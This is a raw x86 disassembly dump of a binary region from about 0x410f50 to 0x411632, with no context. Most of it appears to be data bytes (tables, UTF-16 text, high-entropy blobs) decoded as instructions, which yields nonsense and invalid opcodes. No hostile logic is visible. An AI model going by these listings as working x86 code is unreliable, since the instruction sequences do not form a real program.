  410f50:	add    BYTE PTR [eax],al
  410f52:	test   BYTE PTR [ecx+0x1],0x0
  410f56:	push   cs
  410f57:	or     DWORD PTR [eax],eax
  410f59:	add    ah,ah
  410f5b:	add    al,0x0
  410f5d:	add    BYTE PTR [eax],al
  410f5f:	add    BYTE PTR [eax],al
  410f61:	add    BYTE PTR [ebx+edx*2],al
  410f64:	add    DWORD PTR [eax],eax
  410f66:	adc    cl,BYTE PTR [ecx]
  410f68:	add    BYTE PTR [eax],al
  410f6a:	in     al,0x4
  410f6c:	add    BYTE PTR [eax],al
  410f6e:	add    BYTE PTR [eax],al
  410f70:	add    BYTE PTR [eax],al
  410f72:	push   ss
  410f73:	pop    esp
  410f74:	add    DWORD PTR [eax],eax
  410f76:	push   cs
  410f77:	or     DWORD PTR [eax],eax
  410f79:	add    ah,ah
  410f7b:	add    al,0x0
  410f7d:	add    BYTE PTR [eax],al
  410f7f:	add    BYTE PTR [eax],al
  410f81:	add    BYTE PTR [eiz*2+0x90e0001],ah
  410f88:	add    BYTE PTR [eax],al
  410f8a:	in     al,0x4
  410f8c:	add    BYTE PTR [eax],al
  410f8e:	add    BYTE PTR [eax],al
  410f90:	add    BYTE PTR [eax],al
  410f92:	xor    ch,BYTE PTR [esi+0x1]
  410f95:	add    BYTE PTR [edx],cl
  410f97:	or     DWORD PTR [eax],eax
  410f99:	add    ah,ah
  410f9b:	add    al,0x0
  410f9d:	add    BYTE PTR [eax],al
  410f9f:	add    BYTE PTR [eax],al
  410fa1:	add    BYTE PTR [edi+esi*2],bh
  410fa4:	add    DWORD PTR [eax],eax
  410fa6:	push   cs
  410fa7:	or     DWORD PTR [eax],eax
  410fa9:	add    ah,ah
  410fab:	add    al,0x0
  410fad:	add    BYTE PTR [eax],al
  410faf:	add    BYTE PTR [eax],al
  410fb1:	add    BYTE PTR [edx-0x80],cl
  410fb4:	add    DWORD PTR [eax],eax
  410fb6:	or     cl,BYTE PTR [ecx]
  410fb8:	add    BYTE PTR [eax],al
  410fba:	in     al,0x4
  410fbc:	add    BYTE PTR [eax],al
  410fbe:	add    BYTE PTR [eax],al
  410fc0:	add    BYTE PTR [eax],al
  410fc2:	push   esp
  410fc3:	mov    DWORD PTR [ecx],eax
  410fc5:	add    BYTE PTR [esi],al
  410fc7:	or     DWORD PTR [eax],eax
  410fc9:	add    ah,ah
  410fcb:	add    al,0x0
  410fcd:	add    BYTE PTR [eax],al
  410fcf:	add    BYTE PTR [eax],al
  410fd1:	add    BYTE PTR [edx-0x6e],bl
  410fd4:	add    DWORD PTR [eax],eax
  410fd6:	push   es
  410fd7:	or     DWORD PTR [eax],eax
  410fd9:	add    ah,ah
  410fdb:	add    al,0x0
  410fdd:	add    BYTE PTR [eax],al
  410fdf:	add    BYTE PTR [eax],al
  410fe1:	add    BYTE PTR [eax-0x65],ah
  410fe4:	add    DWORD PTR [eax],eax
  410fe6:	add    cl,BYTE PTR [ecx]
  410fe8:	add    BYTE PTR [eax],al
  410fea:	in     al,0x4
  410fec:	add    BYTE PTR [eax],al
  410fee:	add    BYTE PTR [eax],al
  410ff0:	add    BYTE PTR [eax],al
  410ff2:	bound  esp,QWORD PTR [ecx+eax*1+0x3200]
  410ff9:	add    ah,ah
  410ffb:	add    al,0x0
  410ffd:	add    BYTE PTR [eax],al
  410fff:	add    BYTE PTR [eax],al
  411001:	add    BYTE PTR [esp+eiz*4+0x9060001],dl
  411008:	add    BYTE PTR [eax],al
  41100a:	in     al,0x4
  41100c:	add    BYTE PTR [eax],al
  41100e:	add    BYTE PTR [eax],al
  411010:	add    BYTE PTR [eax],al
  411012:	call   0x9:0x20001ad
  411019:	add    ah,ah
  41101b:	add    al,0x0
  41101d:	add    BYTE PTR [eax],al
  41101f:	add    BYTE PTR [eax],al
  411021:	add    BYTE PTR [esi+esi*4+0x90e0001],bl
  411028:	add    BYTE PTR [eax],al
  41102a:	in     al,0x4
  41102c:	add    BYTE PTR [eax],al
  41102e:	add    BYTE PTR [eax],al
  411030:	add    BYTE PTR [eax],al
  411032:	stos   BYTE PTR es:[edi],al
  411033:	mov    edi,0x90a0001
  411038:	add    BYTE PTR [eax],al
  41103a:	in     al,0x4
  41103c:	add    BYTE PTR [eax],al
  41103e:	add    BYTE PTR [eax],al
  411040:	add    BYTE PTR [eax],al
  411042:	mov    ah,0xc8
  411044:	add    DWORD PTR [eax],eax
  411046:	push   cs
  411047:	or     DWORD PTR [eax],eax
  411049:	add    ah,ah
  41104b:	add    al,0x0
  41104d:	add    BYTE PTR [eax],al
  41104f:	add    BYTE PTR [eax],al
  411051:	add    dl,al
  411053:	rol    DWORD PTR [ecx],1
  411055:	add    BYTE PTR [edx],al
  411057:	or     DWORD PTR [eax],eax
  411059:	add    ah,ah
  41105b:	add    al,0x0
  41105d:	add    BYTE PTR [eax],al
  41105f:	add    BYTE PTR [eax],al
  411061:	add    ah,al
  411063:	fiadd  DWORD PTR [ecx]
  411065:	add    BYTE PTR [esi],cl
  411067:	or     DWORD PTR [eax],eax
  411069:	add    ah,ah
  41106b:	add    al,0x0
  41106d:	add    BYTE PTR [eax],al
  41106f:	add    BYTE PTR [eax],al
  411071:	add    dl,dl
  411073:	jecxz  0x411076
  411075:	add    BYTE PTR [esi],cl
  411077:	or     DWORD PTR [eax],eax
  411079:	add    ah,ah
  41107b:	add    al,0x0
  41107d:	add    BYTE PTR [eax],al
  41107f:	add    BYTE PTR [eax],al
  411081:	add    al,ah
  411083:	in     al,dx
  411084:	add    DWORD PTR [eax],eax
  411086:	push   es
  411087:	or     DWORD PTR [eax],eax
  411089:	add    ah,ah
  41108b:	add    al,0x0
  41108d:	add    BYTE PTR [eax],al
  41108f:	add    BYTE PTR [eax],al
  411091:	add    dh,ah
  411093:	cmc    
  411094:	add    DWORD PTR [eax],eax
  411096:	or     cl,BYTE PTR [ecx]
  411098:	add    BYTE PTR [eax],al
  41109a:	in     al,0x4
  41109c:	add    BYTE PTR [eax],al
  41109e:	add    BYTE PTR [eax],al
  4110a0:	add    BYTE PTR [eax],al
  4110a2:	lock inc BYTE PTR [ecx]
  4110a5:	add    dh,bh
  4110a7:	or     BYTE PTR [eax],al
  4110a9:	add    ah,ah
  4110ab:	add    al,0x0
  4110ad:	add    BYTE PTR [eax],al
  4110af:	add    BYTE PTR [eax],al
  4110b1:	add    dh,ch
  4110b3:	pop    es
  4110b4:	add    al,BYTE PTR [eax]
  4110b6:	adc    cl,BYTE PTR [ecx]
  4110b8:	add    BYTE PTR [eax],al
  4110ba:	in     al,0x4
  4110bc:	add    BYTE PTR [eax],al
  4110be:	add    BYTE PTR [eax],al
  4110c0:	add    BYTE PTR [eax],al
  4110c2:	add    BYTE PTR [ecx],dl
  4110c4:	add    al,BYTE PTR [eax]
  4110c6:	push   es
  4110c7:	or     DWORD PTR [eax],eax
  4110c9:	add    ah,ah
  4110cb:	add    al,0x0
  4110cd:	add    BYTE PTR [eax],al
  4110cf:	add    BYTE PTR [eax],al
  4110d1:	add    BYTE PTR ds:0x42004400,cl
  4110d7:	add    BYTE PTR [ebx+0x0],dl
  4110da:	pop    edi
  4110db:	add    BYTE PTR [eax],dh
  4110dd:	add    BYTE PTR [ebp+0x0],dl
  4110e0:	inc    esi
  4110e1:	add    BYTE PTR [eax+0x0],cl
  4110e4:	inc    ebx
  4110e5:	add    BYTE PTR [edi+0x0],bl
  4110e8:	aaa    
  4110e9:	add    BYTE PTR [ebx+0x0],cl
  4110ec:	xor    al,0x0
  4110ee:	or     BYTE PTR [eax],al
  4110f0:	push   ebx
  4110f1:	add    BYTE PTR [ebp+0x0],cl
  4110f4:	xor    DWORD PTR [eax],eax
  4110f6:	pop    edi
  4110f7:	add    BYTE PTR [ebp+0x0],al
  4110fa:	push   ebp
  4110fb:	add    BYTE PTR [edi],dh
  4110fd:	add    BYTE PTR [eax],dh
  4110ff:	add    BYTE PTR [edi],cl
  411101:	add    BYTE PTR [eax+eax*1+0x4f],al
  411105:	add    BYTE PTR [ecx+0x0],dl
  411108:	pop    edi
  411109:	add    BYTE PTR [eax+eax*1+0x32],cl
  41110d:	add    BYTE PTR ds:0x59003600,dh
  411113:	add    BYTE PTR [edi+0x0],bl
  411116:	cmp    DWORD PTR [eax],eax
  411118:	cmp    DWORD PTR [eax],eax
  41111a:	push   edx
  41111b:	add    BYTE PTR [ebx],dh
  41111d:	add    BYTE PTR [edx+0x0],dl
  411120:	or     DWORD PTR [eax],eax
  411122:	inc    edx
  411123:	add    BYTE PTR [eax],dh
  411125:	add    BYTE PTR [edx+0x0],bl
  411128:	xor    eax,0x5f003500
  41112d:	add    BYTE PTR ds:0x36004f00,dh
  411133:	add    BYTE PTR [ebx],cl
  411135:	add    BYTE PTR [eax+eax*1+0x32],al
  411139:	add    BYTE PTR [eax+0x0],dl
  41113c:	xor    eax,DWORD PTR [eax]
  41113e:	xor    eax,DWORD PTR [eax]
  411140:	add    BYTE PTR ss:[ecx],dh
  411143:	add    BYTE PTR [edx],dh
  411145:	add    BYTE PTR [edi+0x0],bl
  411148:	cmp    BYTE PTR [eax],al
  41114a:	inc    edx
  41114b:	add    BYTE PTR [ecx],cl
  41114d:	add    BYTE PTR [ebp+0x0],al
  411150:	push   esp
  411151:	add    BYTE PTR [edx+0x0],cl
  411154:	pop    edi
  411155:	add    BYTE PTR [ecx+0x0],dl
  411158:	xor    DWORD PTR [eax],eax
  41115a:	dec    ecx
  41115b:	add    BYTE PTR [eax+eax*1],dh
  41115e:	cmp    BYTE PTR [eax],al
  411160:	or     al,0x0
  411162:	push   ecx
  411163:	add    BYTE PTR [ebp+0x0],dl
  411166:	inc    ebx
  411167:	add    BYTE PTR [edi+0x0],bl
  41116a:	xor    eax,0x32004400
  41116f:	add    BYTE PTR [eax],dh
  411171:	add    BYTE PTR [edi+0x0],bl
  411174:	xor    al,BYTE PTR [eax]
  411176:	dec    ecx
  411177:	add    BYTE PTR [edi+0x0],dl
  41117a:	or     BYTE PTR [eax],al
  41117c:	inc    ebp
  41117d:	add    BYTE PTR [eax],bh
  41117f:	add    BYTE PTR [eax],bh
  411181:	add    BYTE PTR [edi+0x0],bl
  411184:	dec    ebx
  411185:	add    BYTE PTR [eax+0x0],cl
  411188:	push   eax
  411189:	add    BYTE PTR [ecx],bh
  41118b:	add    BYTE PTR [ebx],cl
  41118d:	add    BYTE PTR [edi+0x0],cl
  411190:	aaa    
  411191:	add    BYTE PTR [eax],dh
  411193:	add    BYTE PTR [edx],dh
  411195:	add    BYTE PTR [edi+0x0],bl
  411198:	cmp    DWORD PTR [eax],eax
  41119a:	cmp    BYTE PTR [eax],al
  41119c:	inc    edi
  41119d:	add    BYTE PTR [edi+0x0],bl
  4111a0:	xor    BYTE PTR [eax],al
  4111a2:	dec    ebp
  4111a3:	add    BYTE PTR [edi],cl
  4111a5:	add    BYTE PTR [esi+0x0],al
  4111a8:	inc    esp
  4111a9:	add    BYTE PTR ds:0x36003300,dh
  4111af:	add    BYTE PTR [edi+0x0],bl
  4111b2:	push   esi
  4111b3:	add    BYTE PTR [ebp+0x0],dl
  4111b6:	dec    ebp
  4111b7:	add    BYTE PTR [esi+0x0],al
  4111ba:	pop    edi
  4111bb:	add    BYTE PTR [ecx],dh
  4111bd:	add    BYTE PTR [edx+0x0],bl
  4111c0:	inc    edi
  4111c1:	add    BYTE PTR [ecx+0x0],bl
  4111c4:	or     BYTE PTR [eax],al
  4111c6:	push   eax
  4111c7:	add    BYTE PTR [eax],dh
  4111c9:	add    BYTE PTR [edx],dh
  4111cb:	add    BYTE PTR [ebx],dh
  4111cd:	add    BYTE PTR [edi+0x0],bl
  4111d0:	push   eax
  4111d1:	add    BYTE PTR [eax],bh
  4111d3:	add    BYTE PTR [ecx+0x0],dl
  4111d6:	or     al,0x0
  4111d8:	inc    esi
  4111d9:	add    BYTE PTR [edx+0x0],bl
  4111dc:	dec    esp
  4111dd:	add    BYTE PTR [edi+0x0],bl
  4111e0:	add    BYTE PTR ss:[ebx],dh
  4111e3:	add    BYTE PTR [edi+0x0],cl
  4111e6:	push   esi
  4111e7:	add    BYTE PTR [eax+eax*1],dh
  4111ea:	pop    edi
  4111eb:	add    BYTE PTR [eax],bh
  4111ed:	add    BYTE PTR [esi+0x0],cl
  4111f0:	or     BYTE PTR [eax],al
  4111f2:	dec    edi
  4111f3:	add    BYTE PTR [edx+0x0],dl
  4111f6:	push   esp
  4111f7:	add    BYTE PTR [edi+0x0],bl
  4111fa:	push   ebp
  4111fb:	add    BYTE PTR [edx],dh
  4111fd:	add    BYTE PTR [ecx+0x0],bl
  411200:	xor    eax,DWORD PTR [eax]
  411202:	push   cs
  411203:	add    BYTE PTR [eax+0x0],cl
  411206:	cmp    DWORD PTR [eax],eax
  411208:	dec    ebx
  411209:	add    BYTE PTR [edi+0x0],bl
  41120c:	xor    al,0x0
  41120e:	inc    ecx
  41120f:	add    BYTE PTR [ecx],bh
  411211:	add    BYTE PTR [esi+0x0],dl
  411214:	cmp    DWORD PTR [eax],eax
  411216:	pop    edi
  411217:	add    BYTE PTR [eax+0x0],cl
  41121a:	dec    ecx
  41121b:	add    BYTE PTR [eax+eax*1+0x58],al
  41121f:	add    BYTE PTR [eax],cl
  411221:	add    BYTE PTR [eax+0x0],dl
  411224:	dec    esi
  411225:	add    BYTE PTR [eax+0x0],cl
  411228:	pop    edi
  411229:	add    BYTE PTR [eax],dh
  41122b:	add    BYTE PTR [ecx+0x0],dl
  41122e:	xor    DWORD PTR [eax],eax
  411230:	dec    ebp
  411231:	add    BYTE PTR [eax+eax*1],cl
  411234:	dec    edx
  411235:	add    BYTE PTR [eax+0x0],dl
  411238:	push   ecx
  411239:	add    BYTE PTR [edi+0x0],bl
  41123c:	dec    ecx
  41123d:	add    BYTE PTR [eax+eax*1+0x48],al
  411241:	add    BYTE PTR [edx+0x0],cl
  411244:	pop    edi
  411245:	add    BYTE PTR [ebp+0x0],al
  411248:	inc    ebp
  411249:	add    BYTE PTR [eax],dh
  41124b:	add    BYTE PTR [edx],cl
  41124d:	add    BYTE PTR [ebx+0x0],cl
  411250:	xor    BYTE PTR [eax],al
  411252:	xor    eax,0x54005f00
  411257:	add    BYTE PTR ds:0x53005700,dh
  41125d:	add    BYTE PTR [ecx],bh
  41125f:	add    BYTE PTR [eax+eax*1+0xd],dl
  411263:	add    BYTE PTR [eax+eax*1+0x5a],al
  411267:	add    BYTE PTR [eax],bh
  411269:	add    BYTE PTR ds:0x30005f00,dh
  41126f:	add    BYTE PTR [ebp+0x0],cl
  411272:	inc    ebx
  411273:	add    BYTE PTR [eax+eax*1+0x30],cl
  411277:	add    BYTE PTR [edi+0x0],bl
  41127a:	dec    ecx
  41127b:	add    BYTE PTR [ebx+0x0],al
  41127e:	or     BYTE PTR [eax],al
  411280:	dec    esi
  411281:	add    BYTE PTR [ebp+0x0],al
  411284:	dec    ecx
  411285:	add    BYTE PTR [edi+0x0],bl
  411288:	dec    ecx
  411289:	add    BYTE PTR [edx+0x0],dl
  41128c:	xor    BYTE PTR [eax],al
  41128e:	pop    edx
  41128f:	add    BYTE PTR [ebx],cl
  411291:	add    BYTE PTR [esi+0x0],dl
  411294:	dec    edx
  411295:	add    BYTE PTR [eax+eax*1+0x5f],al
  411299:	add    BYTE PTR [eax+0x0],bl
  41129c:	cmp    BYTE PTR [eax],al
  41129e:	xor    al,0x0
  4112a0:	pop    edx
  4112a1:	add    BYTE PTR [ecx],bh
  4112a3:	add    BYTE PTR [esi],dh
  4112a5:	add    BYTE PTR ds:0x4c000800,dh
  4112ab:	add    BYTE PTR [eax+0x0],bl
  4112ae:	dec    esp
  4112af:	add    BYTE PTR [edi+0x0],bl
  4112b2:	push   eax
  4112b3:	add    BYTE PTR [edx+0x0],cl
  4112b6:	xor    eax,DWORD PTR [eax]
  4112b8:	inc    edi
  4112b9:	add    BYTE PTR [eax+eax*1],cl
  4112bc:	push   eax
  4112bd:	add    BYTE PTR [ebx],dh
  4112bf:	add    BYTE PTR [ebx+0x0],al
  4112c2:	pop    edi
  4112c3:	add    BYTE PTR [edx+0x0],bl
  4112c6:	xor    al,BYTE PTR [eax]
  4112c8:	inc    edi
  4112c9:	add    BYTE PTR [eax],bh
  4112cb:	add    BYTE PTR [edx+0x0],al
  4112ce:	pop    edi
  4112cf:	add    BYTE PTR [edx+0x0],cl
  4112d2:	pop    ecx
  4112d3:	add    BYTE PTR [edx],cl
  4112d5:	add    BYTE PTR [edi+0x0],al
  4112d8:	push   esi
  4112d9:	add    BYTE PTR [ebp+0x0],dl
  4112dc:	cmp    BYTE PTR [eax],al
  4112de:	xor    DWORD PTR [eax],eax
  4112e0:	add    BYTE PTR ss:[edi+0x0],bl
  4112e4:	pop    ecx
  4112e5:	add    BYTE PTR [edx+0x0],bl
  4112e8:	push   ebx
  4112e9:	add    BYTE PTR ds:0x42005100,cl
  4112ef:	add    BYTE PTR [ecx],bh
  4112f1:	add    BYTE PTR [edi+0x0],bl
  4112f4:	inc    ecx
  4112f5:	add    BYTE PTR [esi],dh
  4112f7:	add    BYTE PTR [ecx],bh
  4112f9:	add    BYTE PTR [esi+0x0],dl
  4112fc:	inc    esp
  4112fd:	add    BYTE PTR [edi+0x0],bl
  411300:	inc    ebp
  411301:	add    BYTE PTR [edi+0x0],dl
  411304:	add    BYTE PTR ss:[ecx],cl
  411307:	add    BYTE PTR [edx+0x0],bl
  41130a:	dec    esp
  41130b:	add    BYTE PTR [ecx],dh
  41130d:	add    BYTE PTR [edi+0x0],bl
  411310:	push   ecx
  411311:	add    BYTE PTR [eax+0x0],dl
  411314:	pop    eax
  411315:	add    BYTE PTR [edi+0x0],bl
  411318:	inc    ebp
  411319:	add    BYTE PTR ds:0x47005600,cl
  41131f:	add    BYTE PTR [edx],dh
  411321:	add    BYTE PTR [edi+0x0],bl
  411324:	push   esi
  411325:	add    BYTE PTR [edi+0x0],al
  411328:	inc    ebx
  411329:	add    BYTE PTR [edx+0x0],dl
  41132c:	dec    esi
  41132d:	add    BYTE PTR [edi+0x0],bl
  411330:	inc    edi
  411331:	add    BYTE PTR [eax+eax*1],dh
  411334:	xor    DWORD PTR [eax],eax
  411336:	push   cs
  411337:	add    BYTE PTR [esi+0x0],al
  41133a:	push   esp
  41133b:	add    BYTE PTR [edx+0x0],bl
  41133e:	pop    edi
  41133f:	add    BYTE PTR [edi+0x0],cl
  411342:	inc    edi
  411343:	add    BYTE PTR [ecx+0x0],cl
  411346:	dec    eax
  411347:	add    BYTE PTR [ebx+0x0],cl
  41134a:	pop    edi
  41134b:	add    BYTE PTR [ebx+0x0],cl
  41134e:	push   eax
  41134f:	add    BYTE PTR [edi+0x0],cl
  411352:	dec    esp
  411353:	add    BYTE PTR [eax],cl
  411355:	add    BYTE PTR [eax+0x0],bl
  411358:	push   esi
  411359:	add    BYTE PTR [ebx],dh
  41135b:	add    BYTE PTR [edx],dh
  41135d:	add    BYTE PTR [eax],dh
  41135f:	add    BYTE PTR [eax],dh
  411361:	add    BYTE PTR [eax],bh
  411363:	add    BYTE PTR [edi+0x0],cl
  411366:	push   cs
  411367:	add    BYTE PTR [ecx+0x0],al
  41136a:	inc    ebx
  41136b:	add    BYTE PTR [ecx+0x0],al
  41136e:	cmp    BYTE PTR [eax],al
  411370:	pop    edi
  411371:	add    BYTE PTR [esi+0x0],dl
  411374:	pop    eax
  411375:	add    BYTE PTR [eax],bh
  411377:	add    BYTE PTR [edi+0x0],bl
  41137a:	inc    ebx
  41137b:	add    BYTE PTR [ebp+0x0],al
  41137e:	pop    eax
  41137f:	add    BYTE PTR [eax+eax*1],dh
  411382:	aaa    
  411383:	add    BYTE PTR [eax+eax*1],cl
  411386:	pop    ecx
  411387:	add    BYTE PTR [esi+0x0],cl
  41138a:	push   ecx
  41138b:	add    BYTE PTR [edi+0x0],bl
  41138e:	push   edi
  41138f:	add    BYTE PTR [edx],dh
  411391:	add    BYTE PTR [edi+0x0],al
  411394:	xor    al,BYTE PTR [eax]
  411396:	xor    BYTE PTR [eax],al
  411398:	pop    edi
  411399:	add    BYTE PTR [eax+eax*1+0x47],cl
  41139d:	add    BYTE PTR [edi],cl
  41139f:	add    BYTE PTR [ecx+0x0],al
  4113a2:	cmp    BYTE PTR [eax],al
  4113a4:	push   ecx
  4113a5:	add    BYTE PTR [edi+0x0],bl
  4113a8:	xor    al,0x0
  4113aa:	xor    BYTE PTR [eax],al
  4113ac:	dec    esi
  4113ad:	add    BYTE PTR [ecx+0x0],al
  4113b0:	cmp    BYTE PTR [eax],al
  4113b2:	pop    edi
  4113b3:	add    BYTE PTR ds:0x53004e00,dh
  4113b9:	add    BYTE PTR [ebp+0x0],al
  4113bc:	cmp    BYTE PTR [eax],al
  4113be:	add    BYTE PTR [eax],al
  4113c0:	add    BYTE PTR [eax],al
  4113c2:	pop    ebp
  4113c3:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  4113cd:	shl    dh,cl
  4113cf:	cdq    
  4113d0:	addr16 das 
  4113d2:	xor    ebx,DWORD PTR [edx+0x1]
  4113d5:	add    BYTE PTR [esi],bl
  4113d7:	pop    es
  4113d8:	add    BYTE PTR [eax],al
  4113da:	mov    al,0x85
  4113dc:	fld    DWORD PTR [edx-0x16]
  4113df:	push   0x7bb85fa0
  4113e4:	add    edi,ecx
  4113e6:	pop    esp
  4113e7:	mov    ebx,0xb0f80201
  4113ec:	test   BYTE PTR [ebx+ebx*2-0x61],ah
  4113f0:	inc    ebp
  4113f1:	ja     0x411377
  4113f3:	mov    ?,ebx
  4113f5:	ret    0x508d
  4113f8:	jle    0x4113f5
  4113fa:	out    0x66,al
  4113fc:	mov    ebx,0x76559017
  411401:	jmp    0x8e5c6984
  411406:	cmp    eax,0xaa8a9267
  41140b:	aas    
  41140c:	xor    esp,0xc0c4db41
  411412:	cmp    BYTE PTR [edx+ecx*2-0x19],ah
  411416:	stc    
  411417:	call   0x687d053f
  41141c:	adc    DWORD PTR [eax],eax
  41141e:	pop    ebp
  41141f:	sbb    eax,0xe45cb512
  411424:	jae    0x4113d4
  411426:	sub    BYTE PTR [edx],dh
  411428:	fbstp  TBYTE PTR [esi-0x57]
  41142b:	mov    esp,0x1b364c77
  411430:	mov    bh,0xce
  411432:	out    dx,eax
  411433:	pop    esi
  411434:	test   eax,0x76d7b620
  411439:	ins    DWORD PTR es:[edi],dx
  41143a:	jmp    0xf5386d6e
  41143f:	ret    0xb464
  411442:	mov    ah,0xd1
  411444:	push   edx
  411445:	sbb    DWORD PTR [edx+0x673dba4],edx
  41144b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41144c:	fisub  DWORD PTR ds:0x3925cf0b
  411452:	inc    edi
  411453:	adc    DWORD PTR [eax-0x7b39026c],edx
  411459:	xchg   ecx,eax
  41145a:	push   esi
  41145b:	adc    al,0x50
  41145d:	xor    DWORD PTR [ecx+0x7],edi
  411460:	or     DWORD PTR [esi-0x1600ef7c],eax
  411466:	out    dx,eax
  411467:	mov    esi,0x855f26f1
  41146c:	cmp    cl,BYTE PTR [esi]
  41146e:	aad    0xa4
  411470:	push   eax
  411471:	mov    ecx,0x76ff4897
  411476:	mov    esi,0x2f7d6d94
  41147b:	cmp    cl,al
  41147d:	inc    ebx
  41147e:	clc    
  41147f:	adc    edx,ebp
  411481:	in     al,dx
  411482:	push   edi
  411483:	push   ss
  411484:	ret    
  411485:	lahf   
  411486:	xlat   BYTE PTR ds:[ebx]
  411487:	dec    ebx
  411488:	mov    DWORD PTR [ebx+0x73],ecx
  41148b:	fld    DWORD PTR [ebp-0x6c]
  41148e:	push   eax
  41148f:	rcr    dl,0xdf
  411492:	aaa    
  411493:	into   
  411494:	sbb    DWORD PTR [esi],ebp
  411496:	mov    al,ds:0x33e58f3d
  41149b:	js     0x411513
  41149d:	cld    
  41149e:	jno    0x4114d7
  4114a0:	mov    ebp,0xc2b4ca19
  4114a5:	sub    ebp,esp
  4114a7:	test   al,0x36
  4114a9:	loope  0x4114f5
  4114ab:	mov    bl,0x95
  4114ad:	pusha  
  4114ae:	test   BYTE PTR [eax],0x46
  4114b1:	daa    
  4114b2:	cs mov al,0x16
  4114b5:	adc    al,0xcf
  4114b7:	jle    0x4114f2
  4114b9:	pop    es
  4114ba:	and    BYTE PTR [ecx-0x4],al
  4114bd:	pop    ecx
  4114be:	mov    BYTE PTR [ebp+0x43],dh
  4114c1:	xchg   edx,eax
  4114c2:	fidivr WORD PTR [ebp+0x3256216b]
  4114c8:	fdiv   QWORD PTR [ebx+ebp*4]
  4114cb:	out    0x1c,al
  4114cd:	mul    BYTE PTR [ebp+0x4b]
  4114d0:	xchg   ecx,eax
  4114d1:	sbb    al,BYTE PTR [edx-0x92f3488]
  4114d7:	mov    eax,ds:0xf4cf2812
  4114dc:	daa    
  4114dd:	mov    ch,0x72
  4114df:	jmp    0x44a7:0x5543ee8d
  4114e6:	or     ebp,eax
  4114e8:	pop    esp
  4114e9:	push   ds
  4114ea:	popa   
  4114eb:	idiv   WORD PTR [ecx+0xd]
  4114ef:	jp     0x4114e9
  4114f1:	sub    BYTE PTR [edx-0x6e],bl
  4114f4:	imul   ebx,DWORD PTR [ebp+eiz*1-0x13],0xd94953a8
  4114fc:	xchg   ebx,eax
  4114fd:	les    eax,FWORD PTR [edx]
  4114ff:	mov    ah,0x7a
  411501:	adc    bl,BYTE PTR [ecx-0x64c75c37]
  411507:	xor    esp,DWORD PTR [edx]
  411509:	nop
  41150a:	mov    ds:0x42d736b4,al
  41150f:	adc    DWORD PTR [ebp+0x4b577b86],ebp
  411515:	xor    al,0x69
  411517:	mov    bl,0xe7
  411519:	outs   dx,DWORD PTR ds:[esi]
  41151a:	dec    esp
  41151b:	adc    ch,BYTE PTR [edx+0x66]
  41151e:	repz (bad) 
  411520:	das    
  411521:	mov    bl,0xba
  411523:	dec    BYTE PTR [ecx]
  411525:	into   
  411526:	xchg   ebp,eax
  411527:	dec    ebp
  411528:	in     eax,dx
  411529:	inc    eax
  41152a:	adc    eax,0x4a997903
  41152f:	jmp    0xa462:0x4716140d
  411536:	in     al,dx
  411537:	scas   al,BYTE PTR es:[edi]
  411538:	ins    DWORD PTR es:[edi],dx
  411539:	pop    ebp
  41153a:	cwde   
  41153b:	push   ss
  41153c:	test   eax,0xf32cb3c5
  411541:	push   0xe9b5ec58
  411546:	jp     0x41150a
  411548:	push   es
  411549:	call   0x18a3f76d
  41154e:	rcl    DWORD PTR [edx+ebx*1-0x56e97279],1
  411555:	inc    edi
  411556:	add    edi,edi
  411558:	test   al,0x47
  41155a:	(bad)
  41155d:	push   edi
  41155e:	ror    edx,cl
  411560:	jnp    0x411524
  411562:	xor    DWORD PTR [ecx+ebx*2],0x5fd44604
  411569:	push   edx
  41156a:	fwait
  41156b:	ror    BYTE PTR [ebx],0xcf
  41156e:	jbe    0x4115e1
  411570:	push   ecx
  411571:	lock inc ebp
  411573:	lods   eax,DWORD PTR ds:[esi]
  411574:	sahf   
  411575:	sbb    BYTE PTR [eax],0xf2
  411578:	mov    eax,ds:0x16c5d6da
  41157d:	and    esp,DWORD PTR [ecx+0x720ced97]
  411583:	mov    ?,WORD PTR [ebx]
  411585:	xor    esi,eax
  411587:	and    al,0xcf
  411589:	xlat   BYTE PTR ds:[ebx]
  41158a:	hlt    
  41158b:	mov    ebp,0xa6f814d1
  411590:	cwde   
  411591:	jns    0x4115d1
  411593:	mov    al,0x4f
  411595:	push   eax
  411596:	fmul   st,st(5)
  411598:	or     al,0x5a
  41159a:	in     al,0xd8
  41159c:	add    ebx,esi
  41159e:	ror    DWORD PTR [ebx+0x157d408d],cl
  4115a4:	arpl   dx,si
  4115a6:	mov    ebp,0x9099232
  4115ab:	das    
  4115ac:	jg     0x411540
  4115ae:	and    DWORD PTR [edx-0x3885008c],esp
  4115b4:	je     0x41162b
  4115b6:	pushf  
  4115b7:	into   
  4115b8:	push   ebp
  4115b9:	xchg   ebp,eax
  4115ba:	xor    bh,dh
  4115bc:	xor    bh,BYTE PTR [eax]
  4115be:	lods   al,BYTE PTR ds:[esi]
  4115bf:	jmp    0x792a11a8
  4115c4:	or     bh,BYTE PTR [edx+0x5e40406c]
  4115ca:	sbb    eax,0x7a581b58
  4115cf:	add    edi,DWORD PTR [ebx+0x12]
  4115d2:	stos   DWORD PTR es:[edi],eax
  4115d3:	sbb    DWORD PTR [edx-0x2f21ece2],ebx
  4115d9:	repz dec esp
  4115db:	lods   eax,DWORD PTR ds:[esi]
  4115dc:	scas   al,BYTE PTR es:[edi]
  4115dd:	jnp    0x4115a1
  4115df:	in     al,0x58
  4115e1:	pushf  
  4115e2:	cdq    
  4115e3:	loope  0x41161b
  4115e5:	sbb    al,0xcc
  4115e7:	(bad)  
  4115e8:	lahf   
  4115e9:	jae    0x411617
  4115eb:	dec    eax
  4115ec:	xor    BYTE PTR [ebx-0x1b93bbf7],0xcf
  4115f3:	out    0x9f,al
  4115f5:	popf   
  4115f6:	or     eax,0x51326d3f
  4115fb:	mov    al,ds:0x9d0e0e93
  411600:	imul   esp,DWORD PTR [edx+0x44],0x62
  411604:	cmp    DWORD PTR [esi],ebp
  411606:	repnz mov DWORD PTR [edx-0x403fe17a],edi
  41160d:	ins    BYTE PTR es:[edi],dx
  41160e:	xchg   DWORD PTR [edi],ebp
  411610:	and    al,0xe0
  411612:	and    BYTE PTR [edi+0x19],0x9f
  411616:	icebp  
  411617:	fiadd  DWORD PTR [esi+eax*1+0x59748b27]
  41161e:	pop    ebx
  41161f:	sbb    DWORD PTR [edi+0x69e0093e],0x7bee451b
  411629:	sahf   
  41162a:	out    0x97,eax
  41162c:	js     0x41169e
  41162e:	mov    esi,esp
  411630:	mov    ah,0x50
  411632:	clc    
